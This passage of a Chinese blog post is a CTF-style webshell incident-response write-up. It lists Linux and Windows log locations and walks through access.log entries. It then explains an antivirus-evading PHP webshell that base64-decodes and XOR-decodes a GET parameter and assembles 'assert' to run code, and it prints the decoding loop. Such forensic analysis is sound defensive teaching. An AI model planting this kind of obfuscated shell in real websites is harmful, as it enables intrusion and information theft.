+<p>Linux存储日志的路径一般为<code>/var/log</code>，扩展名为<code>log</code></p>
+<p><strong>Linux常见日志文件</strong></p>
+<table>
+<thead>
+<tr>
+<th>文件名</th>
+<th>作用说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/var/log/syslog</code></td>
+<td>系统日志（Debian/Ubuntu 常见）</td>
+</tr>
+<tr>
+<td><code>/var/log/messages</code></td>
+<td>系统日志（CentOS/RedHat 常见）</td>
+</tr>
+<tr>
+<td><code>/var/log/auth.log</code></td>
+<td>身份验证相关日志（如 SSH 登录）</td>
+</tr>
+<tr>
+<td><code>/var/log/secure</code></td>
+<td>类似于 <code>auth.log</code>，但在 RedHat 系常见</td>
+</tr>
+<tr>
+<td><code>/var/log/kern.log</code></td>
+<td>内核级日志</td>
+</tr>
+<tr>
+<td><code>/var/log/dmesg</code></td>
+<td>内核启动日志</td>
+</tr>
+<tr>
+<td><code>/var/log/boot.log</code></td>
+<td>开机启动日志</td>
+</tr>
+<tr>
+<td><code>/var/log/httpd/access_log</code></td>
+<td>Apache HTTP 访问日志（CentOS）</td>
+</tr>
+<tr>
+<td><code>/var/log/apache2/access.log</code></td>
+<td>Apache 日志（Debian）</td>
+</tr>
+<tr>
+<td><code>/var/log/nginx/access.log</code></td>
+<td>Nginx 访问日志</td>
+</tr>
+<tr>
+<td><code>/var/log/lastlog</code></td>
+<td>用户登录记录（用 <code>lastlog</code> 命令查看）</td>
+</tr>
+<tr>
+<td><code>/var/log/faillog</code></td>
+<td>登录失败记录（用 <code>faillog</code> 查看）</td>
+</tr>
+<tr>
+<td><code>/var/log/btmp</code></td>
+<td>登录失败记录（需用 <code>lastb</code> 查看）</td>
+</tr>
+<tr>
+<td><code>/var/log/wtmp</code></td>
+<td>所有用户登录登出记录（用 <code>last</code> 命令查看）</td>
+</tr>
+</tbody>
+</table>
+<p>Windows存储日志的路径一般为<code>C:\Windows\System32\winevt\Logs\</code>，扩展名为<code>evtx</code></p>
+<p><strong>Windows常见日志文件</strong></p>
+<table>
+<thead>
+<tr>
+<th>文件名</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>System.evtx</code></td>
+<td>系统日志</td>
+</tr>
+<tr>
+<td><code>Application.evtx</code></td>
+<td>应用程序运行日志</td>
+</tr>
+<tr>
+<td><code>Security.evtx</code></td>
+<td>安全日志（登录、权限等）</td>
+</tr>
+<tr>
+<td><code>Setup.evtx</code></td>
+<td>安装更新相关日志</td>
+</tr>
+<tr>
+<td><code>Windows PowerShell.evtx</code></td>
+<td>PowerShell 使用日志</td>
+</tr>
+<tr>
+<td><code>Microsoft-Windows-WMI-Activity.evtx</code></td>
+<td>WMI 活动日志</td>
+</tr>
+</tbody>
+</table>
+<p>我们先查看<code>/var/log</code>里有什么</p>
+<p><img src="https://s2.loli.net/2025/04/16/mfODByuN3RrS5FX.png" alt="image-20250416191744990" /></p>
+<p>已知我们是webshell，所以不在系统日志里找，得在web日志里，而我们又看到了<code>apache2</code>，就很可能在apache(最流行的 Web 服务器之一)里的日志里有免杀马的信息</p>
+<p><img src="https://s2.loli.net/2025/04/16/V1JSlyROCokLeUE.png" alt="" /></p>
+<p>我们直接看<code>access.log</code>，发现有几个可疑请求</p>
+<p><img src="https://s2.loli.net/2025/04/16/JLwD6VumYc8S1b2.png" alt="image-20250416192415812" /></p>
+<p><img src="https://s2.loli.net/2025/04/16/4EzbogjXQYDprIk.png" alt="image-20250416192508676" /></p>
+<p><img src="https://s2.loli.net/2025/04/16/hGPE9poMfe54mHg.png" alt="image-20250416192523618" /></p>
+<p>我们先看<code>/data/tplcache/top.php</code></p>
+<p><img src="https://s2.loli.net/2025/04/16/M15yajiH8VORPz7.png" alt="image-20250416192706225" /></p>
+<p>看起来是个很正常的php代码，是一个管理系统，那我们看下一个<code>/wap/top.php</code></p>
+<p><img src="https://s2.loli.net/2025/04/16/qdwuLa6etZj27iy.png" alt="image-20250416193056445" /></p>
+<p>我们来解析这串代码</p>
+<p><code>&lt;?php</code>是php代码的标准开头</p>
+<p><code>$key = &quot;password&quot;</code>定义了一个密钥</p>
+<p><code>$fun = base64_decode($_GET['func'])</code>请求fuc的资源并进行base64解码(ERsDHgEUC1hI)，将解码内容赋值给fun。<u>不过我很好奇为什么日志里是fuc才拥有这串字符串，可仍然能请求资源成功</u></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$fun</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$fun</span>[<span class="variable">$i</span>] = <span class="variable">$fun</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">7</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>进行异或操作，算是将混淆的内容进行解密，解密内容是<code>phpinfo()</code></p>
+<p><code>$c = $a . $s . $_GET[&quot;func2&quot;]</code>定义一个c进行字符串拼接将<strong>a、s、func2的内容进行依次拼接</strong>，成为<code>assert</code></p>
+<p><code>$c($fun)</code>等价于<code>assert(phpinfo())</code></p>
+<p>很明显，这个就是那个免杀马，为什么呢？<strong>我们得先了解assert()函数和phpinfo()函数</strong></p>
+<p><code>assert</code>原本用于<strong>调试</strong>代码，接受一个表达式并判断是否为真，但自从某个版本之后，<strong>如果往assert()里输入字符串，那么assert()就会被当成是eval()执行</strong>，而<strong>eval()会把字符串当作是php代码</strong>，从而执行任意代码</p>
+<p><code>phpinfo</code>函数会输出完整的php环境信息，包括但不限于<strong>php版本，环境变量，http头，COOKIE等</strong>，很容易造成信息泄露</p>
+<p>所以执行链如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;phpinfo()&quot;</span>)---&gt;<span class="keyword">eval</span>(<span class="string">&quot;phpinfo()&quot;</span>)---&gt;<span class="title function_ invoke__">phpinfo</span>()</span><br></pre></td></tr></table></figure>
+<p>直接造成信息泄露，从而更好植入别的木马</p>
+<p>免杀马路径<code>/var/www/html/wap/top.php</code></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="https://s2.loli.net/2024/11/29/BWUfxhRNo2eOdq5.png" data-sizes="auto" alt="DIR-815" class="lazyload">
+        
+      
+      <a href="/2024/11/25/DIR-815/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          DIR-815
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%BC%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text"> 导言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E5%B7%A5%E5%85%B7"><span class="toc-number">2.</span> <span class="toc-text"> 前置工具</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#webshell%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="toc-number">3.</span> <span class="toc-text"> Webshell应急响应</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">3.1.</span> <span class="toc-text"> 概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E6%9D%80%E6%89%8B%E6%AE%B5"><span class="toc-number">3.2.</span> <span class="toc-text"> 查杀手段</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E5%BE%81%E5%80%BC%E6%90%9C%E7%B4%A2"><span class="toc-number">3.2.1.</span> <span class="toc-text"> 特征值搜索</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%90%9C%E5%AF%BB"><span class="toc-number">3.2.2.</span> <span class="toc-text"> 日志搜寻</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">3.2.3.</span> <span class="toc-text"> 使用工具</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4"><span class="toc-number">4.</span> <span class="toc-text"> 解题步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%91%E5%AE%A2webshell%E9%87%8C%E9%9D%A2%E7%9A%84flag-flagxxxxx-xxxx-xxxx-xxxx-xxxx"><span class="toc-number">4.1.</span> <span class="toc-text"> 黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%91%E5%AE%A2%E4%BD%BF%E7%94%A8%E7%9A%84%E4%BB%80%E4%B9%88%E5%B7%A5%E5%85%B7%E7%9A%84shell-github%E5%9C%B0%E5%9D%80%E7%9A%84md5-flagmd5"><span class="toc-number">4.2.</span> <span class="toc-text"> 黑客使用的什么工具的shell github地址的md5 flag{md5}</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%91%E5%AE%A2%E9%9A%90%E8%97%8Fshell%E7%9A%84%E5%AE%8C%E6%95%B4%E8%B7%AF%E5%BE%84%E7%9A%84md5-flagmd5-%E6%B3%A8-xxxxxxxxxxxxxxxxxx"><span class="toc-number">4.3.</span> <span class="toc-text"> 黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%91%E5%AE%A2%E5%85%8D%E6%9D%80%E9%A9%AC%E5%AE%8C%E6%95%B4%E8%B7%AF%E5%BE%84-md5-flagmd5"><span class="toc-number">4.4.</span> <span class="toc-text"> 黑客免杀马完整路径 md5 flag{md5}</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Dusk" class="lazyload">
+  <div class="sidebar-author-name">Dusk</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">15</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/FallingDusky itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+    <div class="icon-instagram sidebar-social-icon">
+      <a href=https://www.instagram.com/xi_luo_san itemprop="url" target="_blank" aria-label="instagram" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2023-2025
+      <span class="footer-info-sep "></span>
+      Dusk
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        41.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        02:56
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi "></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%BC%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text"> 导言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E5%B7%A5%E5%85%B7"><span class="toc-number">2.</span> <span class="toc-text"> 前置工具</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#webshell%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="toc-number">3.</span> <span class="toc-text"> Webshell应急响应</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">3.1.</span> <span class="toc-text"> 概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E6%9D%80%E6%89%8B%E6%AE%B5"><span class="toc-number">3.2.</span> <span class="toc-text"> 查杀手段</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E5%BE%81%E5%80%BC%E6%90%9C%E7%B4%A2"><span class="toc-number">3.2.1.</span> <span class="toc-text"> 特征值搜索</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%90%9C%E5%AF%BB"><span class="toc-number">3.2.2.</span> <span class="toc-text"> 日志搜寻</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">3.2.3.</span> <span class="toc-text"> 使用工具</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4"><span class="toc-number">4.</span> <span class="toc-text"> 解题步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%91%E5%AE%A2webshell%E9%87%8C%E9%9D%A2%E7%9A%84flag-flagxxxxx-xxxx-xxxx-xxxx-xxxx"><span class="toc-number">4.1.</span> <span class="toc-text"> 黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%91%E5%AE%A2%E4%BD%BF%E7%94%A8%E7%9A%84%E4%BB%80%E4%B9%88%E5%B7%A5%E5%85%B7%E7%9A%84shell-github%E5%9C%B0%E5%9D%80%E7%9A%84md5-flagmd5"><span class="toc-number">4.2.</span> <span class="toc-text"> 黑客使用的什么工具的shell github地址的md5 flag{md5}</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%91%E5%AE%A2%E9%9A%90%E8%97%8Fshell%E7%9A%84%E5%AE%8C%E6%95%B4%E8%B7%AF%E5%BE%84%E7%9A%84md5-flagmd5-%E6%B3%A8-xxxxxxxxxxxxxxxxxx"><span class="toc-number">4.3.</span> <span class="toc-text"> 黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%91%E5%AE%A2%E5%85%8D%E6%9D%80%E9%A9%AC%E5%AE%8C%E6%95%B4%E8%B7%AF%E5%BE%84-md5-flagmd5"><span class="toc-number">4.4.</span> <span class="toc-text"> 黑客免杀马完整路径 md5 flag{md5}</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Dusk" class="lazyload">
+  <div class="sidebar-author-name">Dusk</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">15</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/FallingDusky itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+    <div class="icon-instagram sidebar-social-icon">
+      <a href=https://www.instagram.com/xi_luo_san itemprop="url" target="_blank" aria-label="instagram" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div class="reimu-search-input" id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png"/>
+        </div>
+      </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+  
+<script src="/js/generator_search.js" defer></script>
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.0.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+<script data-pjax>
+  var updateTime = _$('#post-update-time')?.innerHTML;
+
+  if (updateTime) {
+    const update = new Date(updateTime);
+    const now = new Date();
+    const diff = now - update;
+    const days = diff / 86400000;
+    const { daysAgo, message: template } = window.REIMU_CONFIG.outdate;
+    if (days >= daysAgo) {
+      const message = template.replace(/{time}/, updateTime);
+      const blockquote = _$('#outdate-blockquote');
+      if (blockquote) {
+        blockquote.querySelector('p').innerText = message;
+        blockquote.style.display = 'block';
+      }
+    }
+  }
+</script>
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
+
